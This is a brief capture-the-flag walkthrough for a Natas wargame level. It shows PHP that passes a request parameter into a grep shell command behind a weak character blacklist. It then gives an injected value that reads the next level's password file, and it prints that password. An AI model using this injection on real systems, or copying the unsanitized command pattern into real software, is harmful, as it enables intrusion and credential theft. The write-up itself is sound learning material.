Again source code for the page, with the following PHP code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

So it's not so trivial to do command injection, however we can still easily read the file we want:
```
. /etc/natas_webpass/natas11 #
```

Password for the next level is `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`.
